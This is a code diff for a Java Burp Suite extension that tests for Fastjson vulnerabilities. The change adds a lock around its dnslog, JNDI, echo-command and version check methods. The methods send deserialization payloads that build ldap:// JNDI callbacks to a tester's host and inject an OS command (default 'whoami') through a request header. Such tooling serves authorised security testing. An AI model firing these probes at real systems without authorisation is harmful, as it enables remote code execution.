@@ -19,6 +19,8 @@ import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Objects;
+import java.util.concurrent.locks.Lock;
+import java.util.concurrent.locks.ReentrantLock;
 
 import static burp.dao.ConfigDao.getConfig;
 import static burp.dao.FastjsonDao.getFastjsonListsByType;
@@ -43,6 +45,8 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
     private static List<FastjsonBean> versionPayloads = new ArrayList<>(); // jndi payloads
     private static List<FastjsonBean> dnsPayloads = new ArrayList<>(); // jndi payloads
     private static List<FastjsonBean> echoPayloads = new ArrayList<>(); // jndi payloads
+    private static final Lock lock = new ReentrantLock();
+
 
     @Override
     public IHttpService getHttpService() {
@@ -154,137 +158,157 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
     }
     // dnslog检测
     public void CheckDnslog(IHttpRequestResponse[] responses) {
-        IHttpRequestResponse baseRequestResponse = responses[0];
-        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
-        String extensionMethod = analyzeRequest.getMethod();
-        String url = analyzeRequest.getUrl().toString();
-        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
-        String res = "dnslog检测,请查看dnslog服务器";
-        IHttpService iHttpService = baseRequestResponse.getHttpService();
-        for (FastjsonBean fastjson : dnsPayloads) {
-            String fastjsonDnslog = fastjson.getValue();
-            String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslog);
-            String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
-            byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
-            byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
-            IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
-            IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
-            String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-            add(extensionMethod, url, statusCode, res, fuzzPayload,resp);
-        }
-
-    }
-
-    // echo命令检测
-    public void CheckEchoVul(IHttpRequestResponse[] responses) {
-        IHttpRequestResponse baseRequestResponse = responses[0];
-        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
-        String extensionMethod = analyzeRequest.getMethod();
-        String url = analyzeRequest.getUrl().toString();
-        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
-        // 弹出一个输入框，用于获取用户输入的dnslog地址
-        String defaultValue = "whoami";
-        String echoVul = (String) JOptionPane.showInputDialog(null, "请输入echo 命令", "提示", JOptionPane.PLAIN_MESSAGE, null, null, defaultValue);
-        if (echoVul == null){
-            JOptionPane.showMessageDialog(null, "请输入echo命令", "提示", JOptionPane.ERROR_MESSAGE);
-            return;
-        }
-        IHttpService iHttpService = baseRequestResponse.getHttpService();
-        Iterator<FastjsonBean> iterator = echoPayloads.iterator();
-        headers.add("Accept-Cache: " + echoVul);
-        while (iterator.hasNext()) {
-            FastjsonBean fastjson = iterator.next();
-            String fastjsonEcho = fastjson.getValue();
-            byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonEcho);
-            byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
-            IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
-            IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
-            String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-            List<String> headersResp = iResponseInfo.getHeaders();
-            boolean containsContentAuth = false;
-            for (String header : headersResp) {
-                if (header.contains("Content-auth")) {
-                    containsContentAuth = true;
-                    break;
-                }
-            }
-            if (containsContentAuth) {
-                add(extensionMethod, url, statusCode, "echo命令检测完成,发现结果",fastjsonEcho, resp);
-                IScanIssue issues = null;
-                try {
-                    issues = new CustomScanIssue(iHttpService, new URL(url), new IHttpRequestResponse[]{resp},
-                            "Fastjson echo", "Fastjson echo命令检测完成,发现结果",
-                            "High", "Certain");
-                    Utils.callbacks.addScanIssue(issues);
-                } catch (MalformedURLException e) {
-                    throw new RuntimeException(e);
-                }
-            } else {
-                add(extensionMethod, url, statusCode, "echo命令检测完成,未发现结果",fastjsonEcho, resp);
-            }
-        }
-    }
-    // jndi检测
-    public void CheckJNDIVul(IHttpRequestResponse[] responses) {
-        IHttpRequestResponse baseRequestResponse = responses[0];
-        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
-        String extensionMethod = analyzeRequest.getMethod();
-        String url = analyzeRequest.getUrl().toString();
-        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
-        try {
-
-            String jndiStr = "";
-            String defaultValue = "IP"; // 设置默认值
-            String[] options = {"DNS", "IP"}; // 单选框选项
-            String selectedValue = (String) JOptionPane.showInputDialog(null, "请选择类型", "提示",
-                    JOptionPane.PLAIN_MESSAGE, null, options, defaultValue);
-            if (Objects.equals(selectedValue, "DNS")) {
-                jndiStr = dnslog;
-            }
-            if (Objects.equals(selectedValue, "IP")) {
-                jndiStr = ip;
-            }
-
+        lock.lock();
+        try{
+            IHttpRequestResponse baseRequestResponse = responses[0];
+            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
+            String extensionMethod = analyzeRequest.getMethod();
+            String url = analyzeRequest.getUrl().toString();
+            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
+            String res = "dnslog检测,请查看dnslog服务器";
             IHttpService iHttpService = baseRequestResponse.getHttpService();
-            for (FastjsonBean payload : jndiPayloads) {
-                String dnslogKey = "";
-
-                String fastjsonJNDI = payload.getValue();
-                String id = String.valueOf(payload.getId());
-                if (selectedValue.equals("DNS")) {
-                    dnslogKey = "ldap://" + id + "." + jndiStr;
-                } else {
-                    dnslogKey = "ldap://" + jndiStr + "/" + id;
-                }
-                String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
+            for (FastjsonBean fastjson : dnsPayloads) {
+                String fastjsonDnslog = fastjson.getValue();
+                String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslog);
                 String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
                 byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                 byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                 IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                 IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                 String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-                add(extensionMethod, url, statusCode, "jndi检测完成,请查看服务器",fuzzPayload, resp);
+                add(extensionMethod, url, statusCode, res, fuzzPayload,resp);
             }
-        } catch (Exception e) {
-            Utils.stderr.println(e.getMessage());
+        }finally {
+            lock.unlock();
+        }
+
+    }
+
+    // echo命令检测
+    public void CheckEchoVul(IHttpRequestResponse[] responses) {
+        lock.lock();
+        try{
+            IHttpRequestResponse baseRequestResponse = responses[0];
+            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
+            String extensionMethod = analyzeRequest.getMethod();
+            String url = analyzeRequest.getUrl().toString();
+            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
+            // 弹出一个输入框，用于获取用户输入的dnslog地址
+            String defaultValue = "whoami";
+            String echoVul = (String) JOptionPane.showInputDialog(null, "请输入echo 命令", "提示", JOptionPane.PLAIN_MESSAGE, null, null, defaultValue);
+            if (echoVul == null){
+                JOptionPane.showMessageDialog(null, "请输入echo命令", "提示", JOptionPane.ERROR_MESSAGE);
+                return;
+            }
+            IHttpService iHttpService = baseRequestResponse.getHttpService();
+            Iterator<FastjsonBean> iterator = echoPayloads.iterator();
+            headers.add("Accept-Cache: " + echoVul);
+            while (iterator.hasNext()) {
+                FastjsonBean fastjson = iterator.next();
+                String fastjsonEcho = fastjson.getValue();
+                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonEcho);
+                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
+                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
+                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
+                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
+                List<String> headersResp = iResponseInfo.getHeaders();
+                boolean containsContentAuth = false;
+                for (String header : headersResp) {
+                    if (header.contains("Content-auth")) {
+                        containsContentAuth = true;
+                        break;
+                    }
+                }
+                if (containsContentAuth) {
+                    add(extensionMethod, url, statusCode, "echo命令检测完成,发现结果",fastjsonEcho, resp);
+                    IScanIssue issues = null;
+                    try {
+                        issues = new CustomScanIssue(iHttpService, new URL(url), new IHttpRequestResponse[]{resp},
+                                "Fastjson echo", "Fastjson echo命令检测完成,发现结果",
+                                "High", "Certain");
+                        Utils.callbacks.addScanIssue(issues);
+                    } catch (MalformedURLException e) {
+                        throw new RuntimeException(e);
+                    }
+                } else {
+                    add(extensionMethod, url, statusCode, "echo命令检测完成,未发现结果",fastjsonEcho, resp);
+                }
+            }
+        }finally {
+            lock.unlock();
+        }
+    }
+    // jndi检测
+    public void CheckJNDIVul(IHttpRequestResponse[] responses) {
+        lock.lock();
+        try {
+            IHttpRequestResponse baseRequestResponse = responses[0];
+            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
+            String extensionMethod = analyzeRequest.getMethod();
+            String url = analyzeRequest.getUrl().toString();
+            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
+            try {
+
+                String jndiStr = "";
+                String defaultValue = "IP"; // 设置默认值
+                String[] options = {"DNS", "IP"}; // 单选框选项
+                String selectedValue = (String) JOptionPane.showInputDialog(null, "请选择类型", "提示",
+                        JOptionPane.PLAIN_MESSAGE, null, options, defaultValue);
+                if (Objects.equals(selectedValue, "DNS")) {
+                    jndiStr = dnslog;
+                }
+                if (Objects.equals(selectedValue, "IP")) {
+                    jndiStr = ip;
+                }
+
+                IHttpService iHttpService = baseRequestResponse.getHttpService();
+                for (FastjsonBean payload : jndiPayloads) {
+                    String dnslogKey = "";
+
+                    String fastjsonJNDI = payload.getValue();
+                    String id = String.valueOf(payload.getId());
+                    if (selectedValue.equals("DNS")) {
+                        dnslogKey = "ldap://" + id + "." + jndiStr;
+                    } else {
+                        dnslogKey = "ldap://" + jndiStr + "/" + id;
+                    }
+                    String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
+                    String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
+                    byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
+                    byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
+                    IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
+                    IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
+                    String statusCode = String.valueOf(iResponseInfo.getStatusCode());
+                    add(extensionMethod, url, statusCode, "jndi检测完成,请查看服务器",fuzzPayload, resp);
+                }
+            } catch (Exception e) {
+                Utils.stderr.println(e.getMessage());
+            }
+        }finally {
+            lock.unlock();
         }
     }
     // version检测
     public void CheckVersion(IHttpRequestResponse[] responses) {
-        IHttpRequestResponse baseRequestResponse = responses[0];
-        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
-        String extensionMethod = analyzeRequest.getMethod();
-        String url = analyzeRequest.getUrl().toString();
-        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
-        IHttpService iHttpService = baseRequestResponse.getHttpService();
-        for (FastjsonBean fastjson : versionPayloads) {
-            String fastjsonVersion = fastjson.getValue();
-            byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
-            byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
-            IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
-            IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
-            String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-            add(extensionMethod, url, statusCode, "version检测完成,请查看返回包",fastjsonVersion, resp);
+        lock.lock();
+        try{
+            IHttpRequestResponse baseRequestResponse = responses[0];
+            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
+            String extensionMethod = analyzeRequest.getMethod();
+            String url = analyzeRequest.getUrl().toString();
+            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
+            IHttpService iHttpService = baseRequestResponse.getHttpService();
+            for (FastjsonBean fastjson : versionPayloads) {
+                String fastjsonVersion = fastjson.getValue();
+                byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
+                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
+                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
+                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
+                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
+                add(extensionMethod, url, statusCode, "version检测完成,请查看返回包",fastjsonVersion, resp);
+            }
+        }finally {
+            lock.unlock();
         }
     }
     // 添加日志
